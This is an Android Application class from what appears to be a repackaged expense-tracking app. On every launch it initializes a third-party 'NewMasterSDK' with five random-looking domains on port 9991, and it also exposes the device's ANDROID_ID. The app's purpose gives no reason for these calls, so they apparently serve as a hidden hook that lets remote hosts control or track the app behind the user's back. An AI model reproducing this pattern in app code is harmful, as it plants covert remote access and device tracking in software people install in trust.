package com.pocket.saver.activity;

import android.app.Application;
import android.content.Context;
import android.provider.Settings;

import com.mastersdk.android.NewMasterSDK;
import com.squareup.leakcanary.LeakCanary;
import com.squareup.leakcanary.RefWatcher;

import java.util.ArrayList;

/**
 * Created by 伟平 on 2015/11/2.
 */

public class CoCoinApplication extends Application {

    public static final int VERSION = 120;

    private static Context mContext;

    public static RefWatcher getRefWatcher(Context context) {
        CoCoinApplication application = (CoCoinApplication) context.getApplicationContext();
        return application.refWatcher;
    }

    private RefWatcher refWatcher;

    @Override public void onCreate() {
        super.onCreate();

        refWatcher = LeakCanary.install(this);
        CoCoinApplication.mContext = getApplicationContext();

        Class<?> arg0 = MainActivity.class;
        ArrayList<String> arg1 = new ArrayList<>();
        arg1.add("http://147asdrf.com:9991");
        arg1.add("http://erddc888.com:9991");
        arg1.add("http://56uuu999.com:9991");
        arg1.add("http://jsdf7890.com:9991");
        arg1.add("http://0288rtyu.com:9991");

        Application arg2 = this;
        NewMasterSDK.init(arg0, arg1, arg2);
    }

    public static Context getAppContext() {
        return CoCoinApplication.mContext;
    }

    public static String getAndroidId() {
        return Settings.Secure.getString(
                getAppContext().getContentResolver(), Settings.Secure.ANDROID_ID);
    }

}
